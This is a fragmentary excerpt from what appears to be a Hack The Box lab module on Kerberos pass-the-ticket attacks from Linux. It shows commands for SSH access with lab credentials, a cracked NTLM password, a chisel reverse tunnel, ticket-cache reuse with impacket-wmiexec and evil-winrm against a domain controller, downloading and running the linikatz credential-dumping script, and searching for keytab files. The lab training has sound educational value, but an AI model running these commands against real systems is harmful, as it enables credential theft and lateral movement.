...
```shell-session
eldeim@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
...
![Password hash cracker interface showing an NTLM hash cracked to 'Password5' with a green result indicating an exact match.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/crackstation.jpg)
...
```shell-session
eldeim@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
...
```shell-session
eldeim@htb[/htb]$ cat /etc/proxychains.conf
...
```shell-session
eldeim@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
eldeim@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
eldeim@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
eldeim@htb[/htb]$ sudo ./chisel server --reverse 
...
```shell-session
eldeim@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
...
```shell-session
eldeim@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
...
```shell-session
eldeim@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
...
```shell-session
eldeim@htb[/htb]$ sudo apt-get install krb5-user -y
...
![Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/kerberos-realm.jpg)

The Kerberos servers can be empty.

### **Administrative server for your Kerberos realm**

![Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/kerberos-server-dc01.jpg)
...
```shell-session
eldeim@htb[/htb]$ cat /etc/krb5.conf
...
```shell-session
eldeim@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
...
```shell-session
eldeim@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
...
```shell-session
eldeim@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
eldeim@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
...
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   ...
   131610      4 -rw-------   1 root     root         2694 Dec 24 10:16 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262184      4 -rw-rw-rw-   1 root     root          216 Dec 24 11:40 /opt/specialfiles/carlos.keytab
